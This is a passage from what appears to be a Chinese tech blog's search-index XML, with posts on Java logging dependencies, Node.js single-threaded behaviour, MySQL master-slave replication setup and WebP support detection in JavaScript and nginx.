class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.otter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>canal.client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 排除日志第三方库中的日志依赖 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-classic<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jcl-over-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.elasticsearch.client<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>transport<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 排除日志第三方库中的日志依赖 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- logging --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--log4j → slf4j--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-over-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--log4j 2 → slf4j--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-to-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- jcl → slf4j --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jcl-over-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- jul → slf4j --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jul-to-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-classic<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.infoq.com/cn/articles/things-of-java-log-performance">【1】</a> <a href="http://blog.csdn.net/yycdaizi/article/details/8276265">【2】</a> <a href="http://leonmau.blog.51cto.com/2202260/808763">【3】</a> <a href="https://zhuanlan.zhihu.com/p/24272450">【4】</a> <a href="https://zhuanlan.zhihu.com/p/24275518">【5】</a> <a href="http://www.cnblogs.com/chenhongliang/p/5312517.html">【6】</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> log </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nodejs-single-threaded</title>
      <link href="/post/nodejs-single-threaded.html"/>
      <url>/post/nodejs-single-threaded.html</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Node.js是在单线程里运行。你不能并行任何代码, 下面的例子会阻塞 5s。</p><p>当收到第一个请求后，服务器开始阻塞。此时再发第二个请求，服务器是无法处理请求的。待第一个请求响应后，第二个请求才开始处理。因为它只在一个线程里运行你的代码。</p><p>第一个请求 <code>Server Processing</code> 花费大约 5s，第二个花费时间为 9.6s (加上我们手动切换执行的时间，约等于 10s)。从这两个数据可以看出 Node.js 串行的。</p><p>我们应该避免在程序里面做大量的计算，CPU 密集型的任务应当避免的。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> sleep = <span class="built_in">require</span>(<span class="string">&#x27;sleep&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> start = process.<span class="title function_">hrtime</span>();</span><br><span class="line">    sleep.<span class="title function_">sleep</span>(<span class="number">5</span>); <span class="comment">// 阻塞 5s</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;end... %j&#x27;</span>, process.<span class="title function_">hrtime</span>(start));</span><br><span class="line">    res.<span class="title function_">end</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server running at http://localhost:3000/&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="/images/Ctf7gFWA4P.gif"></p><h3 id="Node-js-是单线程的，为什么我们要用它？"><a href="#Node-js-是单线程的，为什么我们要用它？" class="headerlink" title="Node.js 是单线程的，为什么我们要用它？"></a>Node.js 是单线程的，为什么我们要用它？</h3><p>下面的例子是根据根据接收到的id，从数据库中拿到数据并返回。我们项目大部分情况做的事情和这个例子是类似的，从前端拿到数据，去数据库做操作。   </p><p>这里我们需要注意，<code>Node.js</code> 里面的所有IO操作都是异步的。也就是说下面代码中 <code>db.query</code> 是异步执行的。当执行完这一句后，本次 <code>任务</code> 就结束了，服务器就能处理下一个请求了。<br>一般我们执行 <code>5-9</code> 这块的很快，所以在大部分测试中 <code>Node.js</code> 的并发很高。  </p><blockquote><p>很多语言是使用的线程池来处理网络请求，一个线程处理一个请求。线程池的大小往往不会很大。</p></blockquote><p>等 <code>db.query</code> 返回数据后，<code>response</code> 才能拿到数据，然后响应给前端。本次请求就算结束了。</p><p>在需要多次操作数据库的业务中，<code>Node.js</code> 相对于其他语言就有些优势了。假设现在有个逻辑是分页，大部分的写法是两次查询数据库。第一次查询count，第二次查询数据。在 <code>Java</code> 正常情况下，发出查询 count 的请求后，会等待数据库返回结果，然后在发出查询数据的请求，最后花费的时间就是二者相加。查询 count 和获取数据并没有依赖关系。如果我们用 <code>Node.js</code> 时，我们可以很简单的并行去发出两个查询。这样花费的时间就是最慢的那个查询。这样，我们的响应就快了。所以在很多对比测试中 <code>Node.js</code> 的 <code>QPS</code> 很高。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  1 */</span>  <span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="comment">/*  2 */</span>  <span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">&#x27;url&#x27;</span>);</span><br><span class="line"><span class="comment">/*  3 */</span>  </span><br><span class="line"><span class="comment">/*  4 */</span>  <span class="keyword">const</span> server = http.<span class="title function_">createServer</span>(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="comment">/*  5 */</span>      <span class="keyword">let</span> query = url.<span class="title function_">parse</span>(req.<span class="property">url</span>).<span class="property">query</span>;</span><br><span class="line"><span class="comment">/*  6 */</span>  </span><br><span class="line"><span class="comment">/*  7 */</span>      db.<span class="title function_">query</span>(&#123; <span class="attr">id</span>: query.<span class="property">id</span> &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="comment">/*  8 */</span>          res.<span class="title function_">end</span>();</span><br><span class="line"><span class="comment">/*  9 */</span>      &#125;);</span><br><span class="line"><span class="comment">/* 10 */</span>  &#125;);</span><br><span class="line"><span class="comment">/* 12 */</span>  </span><br><span class="line"><span class="comment">/* 13 */</span>  server.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="comment">/* 14 */</span>      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server running at http://localhost:3000/&#x27;</span>);</span><br><span class="line"><span class="comment">/* 15 */</span>  &#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>算法复杂度分析</title>
      <link href="/post/algorithmic-analysis.html"/>
      <url>/post/algorithmic-analysis.html</url>
      
        <content type="html"><![CDATA[<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.cnblogs.com/gaochundong/p/complexity_of_algorithms.html">【1】</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> algorithmic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>make&amp;Makefile&amp;cmake</title>
      <link href="/post/make-makefile-cmake.html"/>
      <url>/post/make-makefile-cmake.html</url>
      
        <content type="html"><![CDATA[<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://zhihu.com/question/27455963/answer/89770919">【1】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL Binlog</title>
      <link href="/post/mysql-binlog.html"/>
      <url>/post/mysql-binlog.html</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.cnblogs.com/martinzhang/p/3454358.html">【1】</a> </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL 主从同步</title>
      <link href="/post/mysql-master-slave.html"/>
      <url>/post/mysql-master-slave.html</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>MySQL 主从同步是在 MySQL 主从复制(Master-Slave Replication)基础上实现的，通过设置在Master MySQL上 的 binlog (使其处于打开状态)，Slave MySQL 上通过一个 I&#x2F;O 线程从 Master MySQL 上读取 binlog，然后传输到 Slave MySQL 的中继日志中，然后 Slave MySQL 的 SQL 线程从中继日志中读取中继日志，然后应用到 Slave MySQL 的数据库中。这样实现了主从数据同步功能。</p><h3 id="配置主从同步"><a href="#配置主从同步" class="headerlink" title="配置主从同步"></a>配置主从同步</h3><p>mysql主备复制实现</p><p><img src="/images/687474703a2f2f646c2e6974.jpeg"></p><p>从上层来看，复制分成三步：</p><ol><li>master将改变记录到二进制日志(binary log)中（这些记录叫做二进制日志事件，binary log events，可以通过show binlog events进行查看）；</li><li>slave将master的binary log events拷贝到它的中继日志(relay log)；</li><li>slave重做中继日志中的事件，将改变反映它自己的数据。</li></ol><h4 id="配置主库"><a href="#配置主库" class="headerlink" title="配置主库"></a>配置主库</h4><ol><li><p>开启主数据库的 binlog（二进制日志功能），并设置 server-id</p><p> 修改配置文件</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line"></span><br><span class="line">server-id = 1  </span><br><span class="line">log-bin = mysql-bin   </span><br><span class="line">binlog-format = row</span><br></pre></td></tr></table></figure></li><li><p>创建用于同步数据的账号 slave   </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant replication slave on *.* to &#x27;slave&#x27;@&#x27;%&#x27; identified by &#x27;slave2017&#x27;;</span><br><span class="line"></span><br><span class="line">flush privileges;   </span><br></pre></td></tr></table></figure></li><li><p>锁表并查看当前日志名称和位置(pos)    </p><p> 锁表</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flush table with read lock;</span><br></pre></td></tr></table></figure><blockquote><p>5.1版本的MySQL版本的锁表语句是flush tables with read lock; 5.5版本的MySQL的锁表语句是flush table with read lock;</p></blockquote><p> 查看位置</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show master status;  </span><br><span class="line">+------------------+----------+--------------+------------------+  </span><br><span class="line">| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB |  </span><br><span class="line">+------------------+----------+--------------+------------------+  </span><br><span class="line">| mysql-bin.000009 |      196 |              |                  |  </span><br><span class="line">+------------------+----------+--------------+------------------+  </span><br><span class="line">1 row in set  </span><br></pre></td></tr></table></figure></li><li><p>备份当前主数据库的全部数据（全备）</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -ppassword -S /var/lib/mysql/mysql.sock  -B curder --events --master-data=2 &gt; rep.sql</span><br></pre></td></tr></table></figure><blockquote><p>也可以直接将导出结果导入从库</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -ppassword -S /var/lib/mysql/mysql.sock  -B curder --events --master-data=2 | mysql -uroot -paaaaaa -h10.0.1.4</span><br></pre></td></tr></table></figure></blockquote></li><li><p>解锁数据库</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlock tables;</span><br></pre></td></tr></table></figure></li></ol><h4 id="配置从库"><a href="#配置从库" class="headerlink" title="配置从库"></a>配置从库</h4><ol><li><p>配置 server-id</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line"></span><br><span class="line">server-id = 2</span><br></pre></td></tr></table></figure></li><li><p>将全备导入到数据库</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -paaaaaa -S /var/lib/mysql/mysql.sock &lt; ~/rep.sql</span><br></pre></td></tr></table></figure></li><li><p>执行同步命令</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; change master to master_host=&#x27;10.0.1.11&#x27;,master_user=&#x27;slave&#x27;,master_password=&#x27;slave2017&#x27;,master_log_file=&#x27;mysql-bin.000009&#x27;,master_log_pos=196;  </span><br></pre></td></tr></table></figure><blockquote><p>这里的 <code>master_log_file</code> 和 <code>master_log_pos</code> 就是主表锁表后执行<code>show master status;</code> 输出的。</p></blockquote><p> 开启同步</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start slave;</span><br></pre></td></tr></table></figure></li><li><p>查看同步状态</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show slave status\G</span><br></pre></td></tr></table></figure><blockquote><p>Slave_IO_Running: Yes # 从库IO进程(从master服务器取log的线程)<br>Slave_SQL_Running: Yes # 从库SQL进程(读取relaylog 写数据)<br>Seconds_Behind_Master: 0 # 落后主库的秒数</p></blockquote></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://wangwei007.blog.51cto.com/68019/965575">【1】</a><a href="http://blog.csdn.net/mycwq/article/details/17136001">【2】</a> <a href="https://www.kancloud.cn/curder/mysql/71977">【3】</a><a href="http://www.cnblogs.com/martinzhang/p/3454386.html">【4】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WebP</title>
      <link href="/post/webp.html"/>
      <url>/post/webp.html</url>
      
        <content type="html"><![CDATA[<h2 id="WebP"><a href="#WebP" class="headerlink" title="WebP"></a>WebP</h2><h3 id="Can-i-use-WebP"><a href="#Can-i-use-WebP" class="headerlink" title="Can i use WebP"></a>Can i use WebP</h3><ol><li><p>根据accept请求头判断</p><p> 如果是Chrome浏览器它会在请求头<code>accept</code>中加入<code>image/webp</code>。</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">or </span><br><span class="line"></span><br><span class="line">accept: image/webp,image/apng,image/*,*/*;q=0.8</span><br></pre></td></tr></table></figure></li><li><p>前端检测</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// check_webp_feature:</span></span><br><span class="line"><span class="comment">//   &#x27;feature&#x27; can be one of &#x27;lossy&#x27;, &#x27;lossless&#x27;, &#x27;alpha&#x27; or &#x27;animation&#x27;.</span></span><br><span class="line"><span class="comment">//   &#x27;callback(feature, result)&#x27; will be passed back the detection result (in an asynchronous way!)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check_webp_feature</span>(<span class="params">feature, callback</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> kTestImages = &#123;</span><br><span class="line">        <span class="attr">lossy</span>: <span class="string">&quot;UklGRiIAAABXRUJQVlA4IBYAAAAwAQCdASoBAAEADsD+JaQAA3AAAAAA&quot;</span>,</span><br><span class="line">        <span class="attr">lossless</span>: <span class="string">&quot;UklGRhoAAABXRUJQVlA4TA0AAAAvAAAAEAcQERGIiP4HAA==&quot;</span>,</span><br><span class="line">        <span class="attr">alpha</span>: <span class="string">&quot;UklGRkoAAABXRUJQVlA4WAoAAAAQAAAAAAAAAAAAQUxQSAwAAAARBxAR/Q9ERP8DAABWUDggGAAAABQBAJ0BKgEAAQAAAP4AAA3AAP7mtQAAAA==&quot;</span>,</span><br><span class="line">        <span class="attr">animation</span>: <span class="string">&quot;UklGRlIAAABXRUJQVlA4WAoAAAASAAAAAAAAAAAAQU5JTQYAAAD/////AABBTk1GJgAAAAAAAAAAAAAAAAAAAGQAAABWUDhMDQAAAC8AAAAQBxAREYiI/gcA&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">    img.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> result = (img.<span class="property">width</span> &gt; <span class="number">0</span>) &amp;&amp; (img.<span class="property">height</span> &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="title function_">callback</span>(feature, result);</span><br><span class="line">    &#125;;</span><br><span class="line">    img.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">callback</span>(feature, <span class="literal">false</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    img.<span class="property">src</span> = <span class="string">&quot;data:image/webp;base64,&quot;</span> + kTestImages[feature];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>如果使用了<code>内容协商</code>的方式返回了webp格式的图片，在使用CDN或缓存的情况我们需要在响应头加入<a href="http-vary.html">Vary</a>字段来告诉该如何缓存。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ ^/webp/(.*)\.(jpg|png|gif)$</span> &#123;</span><br><span class="line">    <span class="attribute">set</span> <span class="variable">$filename</span>    <span class="variable">$1</span>;</span><br><span class="line">    <span class="comment"># 判断是否支持webp及文件是否存在</span></span><br><span class="line">    <span class="attribute">set</span> <span class="variable">$swebp</span>       <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment"># $swebp 第一位用来判断客户端是否支持webp</span></span><br><span class="line">    <span class="attribute">if</span> (<span class="variable">$http_accept</span> <span class="regexp">~* &quot;image\/webp&quot;)</span> &#123;</span><br><span class="line">        <span class="attribute">set</span> <span class="variable">$swebp</span>   <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># $swebp 